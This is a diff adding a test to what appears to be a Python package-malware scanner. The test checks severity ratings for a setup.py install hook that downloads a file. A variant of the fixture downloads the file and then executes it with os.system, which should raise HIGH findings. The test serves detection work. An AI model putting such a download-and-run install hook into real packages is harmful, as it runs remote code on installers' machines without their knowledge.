@@ -1374,3 +1374,19 @@ def test_vendored_library_blob_into_module_namespace_is_medium():
 )
 def test_blob_that_acts_at_import_or_runs_in_globals_stays_high(source, ns):
     assert Severity.HIGH in [f.severity for f in _obf(_vendored(source, ns))]
+
+
+def test_install_hook_that_only_downloads_is_medium():
+    """haddock3 — install 훅이 데이터 파일을 내려받기만 한다."""
+    src = ("from setuptools.command.install import install\n"
+           "from urllib.request import urlretrieve\n"
+           "class I(install):\n    def run(self):\n        urlretrieve('https://x/data.bin', 'd')\n"
+           "        install.run(self)\nsetup(cmdclass={'install': I})\n")
+    hooks = [f for f in analyze_files({"p-1/PKG-INFO": "Name: p", "p-1/setup.py": src})
+             if f.rule == RULE_INSTALL_HOOK]
+    assert [f.severity for f in hooks] == [Severity.MEDIUM]
+    assert _high_rules({"p-1/setup.py": src}) == set()
+    # 받고 실행하면 둘 다 HIGH
+    run = src.replace("        install.run(self)\n",
+                      "        import os; os.system('./d')\n        install.run(self)\n")
+    assert {RULE_INSTALL_HOOK, RULE_INSTALL_TIME} <= _high_rules({"p-1/setup.py": run})
